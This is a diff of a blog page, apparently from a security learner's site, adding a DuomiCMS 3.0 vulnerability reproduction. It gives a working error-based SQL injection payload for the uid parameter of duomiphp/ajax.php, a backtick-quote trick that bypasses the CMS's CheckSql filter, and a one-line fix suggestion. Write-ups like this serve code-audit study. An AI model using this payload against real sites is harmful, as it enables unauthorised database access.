@@ -20,6 +20,7 @@
 <meta property="og:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/zq6PJI1l7foYyBd.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/cUYjDR5lkptXsKS.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/Cy7VeMEb5v4ptRA.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/5AJ8cvaYbdiVCE4.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/qD6shGywfbBEC21.png">
@@ -28,7 +29,19 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/27/vk2Rt4AF7yErdgM.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/WP6VxQLvKAo9t7E.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/27/Wbm6URAkLco5ufP.png">
-<meta property="og:updated_time" content="2019-09-27T08:56:45.752Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/vpG6oKi2CZ1cgRw.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/JTfV4kBd9eltYrE.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/3GRwVuDPdmhjF58.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/HQFutYNXbsleS8k.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/DXny8amdfjsORel.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/mZgM1tzjXdwIxOa.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/PTwAZ8da9qBn7Uz.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/jrviQW7TsoP9cXK.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/cqs6mUzdxT9JDZv.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/N7fM86oOwEBnduh.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/7lIbyiE4YN8ZHCK.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/28/It7lDocyQb6wPzF.png">
+<meta property="og:updated_time" content="2019-09-28T02:52:33.836Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DuomiCMS3.0漏洞复现">
 <meta name="twitter:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。">
@@ -202,6 +215,10 @@
 <blockquote>
 <p>漏洞二    sql注入</p>
 </blockquote>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/duomi/duomiphp/ajax.php?action=addfav&amp;id=1&amp;uid=111 and `&apos;`.``.vid and updatexml(1,concat(0x7e,(select database()),0x7e),1) and `&apos;`.``.vid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/28/cUYjDR5lkptXsKS.png" alt="Snipaste_2019-09-28_10-26-51.png"></p>
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>漏洞一 </p>
 </blockquote>
@@ -231,7 +248,7 @@
 <p>然后进行正则匹配，存入$iar数组</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br></pre></td></tr></table></figure>
 
-<p>parseStrIf()函数处理=，没啥影响，</p>
+<p>parseStrIf()函数处理<code>=</code>，没啥影响，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function parseStrIf($strIf)</span><br><span class="line">	&#123;</span><br><span class="line">		if(strpos($strIf,&apos;=&apos;)===false)</span><br><span class="line">		&#123;</span><br><span class="line">			return $strIf;</span><br><span class="line">		&#125;</span><br><span class="line">		if((strpos($strIf,&apos;==&apos;)===false)&amp;&amp;(strpos($strIf,&apos;=&apos;)&gt;0))</span><br><span class="line">		&#123;</span><br><span class="line">			$strIf=str_replace(&apos;=&apos;, &apos;==&apos;, $strIf);</span><br><span class="line">		&#125;</span><br><span class="line">		$strIfArr =  explode(&apos;==&apos;,$strIf);</span><br><span class="line">		return (empty($strIfArr[0])?&apos;NULL&apos;:$strIfArr[0]).&quot;==&quot;.(empty($strIfArr[1])?&apos;NULL&apos;:$strIfArr[1]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
 <p>所以可以构造时直接如下</p>
@@ -244,9 +261,56 @@
 <blockquote>
 <p>漏洞二    七月火师傅是根据cnvd上的通告（只提供了漏洞位置），自己找漏洞成原。对于代码审计来说，这是一种很好的学习方法👍</p>
 </blockquote>
-<p>我也先自己找找试试。。。</p>
+<p>我也先自己找找试试。。。发现自己还是tcl，于是还是参考师傅的挖掘思路</p>
 <p>已知sql注入漏洞存在duomiphp/ajax.php</p>
-<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/2828" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828</a></p>
+<p>整理出所有类型的sql注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select v_digg,v_tread,v_score,v_scorenum from duomi_data where v_id=&quot;.$id;</span><br><span class="line">Update `duomi_data` set v_digg = v_digg + 1 where v_id=$id</span><br><span class="line">insert into `duomi_favorite` values(&apos;&apos;,&apos;$uid&apos;,&apos;$id&apos;,&apos;&quot;.time().&quot;&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>第一处，查看id变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = (isset($id) &amp;&amp; is_numeric($id)) ? $id : 0;</span><br></pre></td></tr></table></figure>
+
+<p>id有is_numeric()进行变量类型检查，七月火师傅文章里写到可以用16进制绕过，但是我本地测试发现16进制无法绕过is_numberic()，16进制为数字字符串时返回false，如果说错了请斧正😋</p>
+<p><img src="https://i.loli.net/2019/09/28/vpG6oKi2CZ1cgRw.png" alt="Snipaste_2019-09-28_08-35-46.png"></p>
+<p>但是上面还存在一个$uid，可以利用common.php中的变量覆盖</p>
+<p><img src="https://i.loli.net/2019/09/28/JTfV4kBd9eltYrE.png" alt="Snipaste_2019-09-28_08-40-01.png"></p>
+<p>不过因为insert into语句中uid变量两边存在单引号，所以insert into二次注入应该是不存在了</p>
+<p>因为id被所以考虑uid，搜索</p>
+<p><img src="https://i.loli.net/2019/09/28/3GRwVuDPdmhjF58.png" alt="Snipaste_2019-09-28_08-51-08.png"></p>
+<p>思路，因为只存在ok回显，考虑盲注或者报错注入，因为报错注入方便些，先尝试报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Select id From `duomi_favorite` where vid=1 and uid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">11 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>利用上面的变量覆盖，其中的_RunMagicQuotes相当于开启魔术引号，但是我们的paylaod并不需要引号😀</p>
+<p><img src="https://i.loli.net/2019/09/28/HQFutYNXbsleS8k.png" alt="Snipaste_2019-09-28_09-02-07.png"></p>
+<p>intval()用uid=11 and xxx即可绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(intval($uid) &lt; 1) return &quot;err&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>直接拿payload试试</p>
+<p><img src="https://i.loli.net/2019/09/28/DXny8amdfjsORel.png" alt="Snipaste_2019-09-28_09-33-31.png"></p>
+<p>还是得一步一个脚印来，追踪GetOne()</p>
+<p><img src="https://i.loli.net/2019/09/28/mZgM1tzjXdwIxOa.png" alt="Snipaste_2019-09-28_09-14-42.png"></p>
+<p><img src="https://i.loli.net/2019/09/28/PTwAZ8da9qBn7Uz.png" alt="Snipaste_2019-09-28_09-22-29.png"></p>
+<p>经过SetQuery()后，不影响，追踪Execute()</p>
+<p><img src="https://i.loli.net/2019/09/28/jrviQW7TsoP9cXK.png" alt="Snipaste_2019-09-28_09-21-28.png"></p>
+<p>查看CheckSql()</p>
+<p><img src="https://i.loli.net/2019/09/28/cqs6mUzdxT9JDZv.png" alt="Snipaste_2019-09-28_09-26-38.png"></p>
+<p>过滤了一些sql注入的关键词，但是我们的payload没被影响，下面还存在完整检查</p>
+<p><img src="https://i.loli.net/2019/09/28/N7fM86oOwEBnduh.png" alt="Snipaste_2019-09-28_09-42-38.png"></p>
+<p>将sql语句处理存入clean变量，可以看到应该是select子查询这边被过滤了，这也是一开始我失败的原因。分析while中的语句</p>
+<p><img src="https://i.loli.net/2019/09/28/7lIbyiE4YN8ZHCK.png" alt="Snipaste_2019-09-28_09-48-54.png"></p>
+<p>只要让处理过的$clean绕过即可，返回的仍是$db_string</p>
+<p>在一对单引号内容的中间用$s$代替，最后将最后一个单引号到最后的数据就全部返回，构造paylaod（参考七月火师傅，这种绕过语法第一次见👍）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=111 and `&apos;`.``.vid and updatexml(1,concat(0x7e,(select database()),0x7e),1) and `&apos;`.``.vid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/28/It7lDocyQb6wPzF.png" alt="Snipaste_2019-09-28_10-34-18.png"></p>
+<p>db_string</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select id From `duomi_favorite` where vid=1 and uid=111 and `\&apos;`.``.vid and updatexml(1,concat(0x7e,(select database()),0x7e),1) and `\&apos;`.``.vid limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>clean</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select id From `duomi_favorite` where vid=1 and uid=111 and `\$s$`.``.vid limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><p>漏洞一不知道咋说。。。</p>
+<p>漏洞二可以直接对uid参数进行stristr()过滤select等关键词</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/2828" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828</a></p>
 
       
 
